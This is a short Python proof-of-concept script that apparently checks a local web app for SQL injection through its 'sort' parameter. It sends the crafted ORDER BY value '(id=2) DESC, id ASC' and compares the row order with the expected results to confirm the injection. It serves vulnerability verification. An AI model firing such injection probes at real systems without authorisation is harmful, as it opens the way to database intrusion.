#!/usr/bin/env python3
import html
import re
import sys
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:4280/"
PARAM = "sort"


def fetch_rows(sort_value):
    query = urllib.parse.urlencode({PARAM: sort_value})
    url = BASE_URL + "?" + query
    req = urllib.request.Request(url, headers={"User-Agent": "S011-local-poc"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", "replace")

    rows = []
    for match in re.finditer(r"<li>(.*?)：\s*(.*?)</li>", body, re.S):
        id_text = html.unescape(re.sub(r"<[^>]+>", "", match.group(1))).strip()
        name_text = html.unescape(re.sub(r"<[^>]+>", "", match.group(2))).strip()
        try:
            rows.append((int(id_text), name_text))
        except ValueError:
            pass
    return rows


def main():
    expected_normal = [(1, "Alice"), (2, "Bob"), (3, "Carol")]
    expected_test = [(2, "Bob"), (1, "Alice"), (3, "Carol")]

    normal = fetch_rows("id")
    test = fetch_rows("(id=2) DESC, id ASC")

    print("normal sort=id:", normal)
    print("test sort=(id=2) DESC, id ASC:", test)

    if normal == expected_normal and test == expected_test and test != normal:
        print("OBSERVED: ORDER BY expression changed row order; SQL structure injection reachable.")
        return 0

    print("FAILED: expected normal=", expected_normal)
    print("FAILED: expected test=", expected_test)
    print("Check 127.0.0.1:4280 endpoint path, bootstrap.php DB connection, SELECT privilege, seed data, HTML output format, and any extra filter/WAF.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
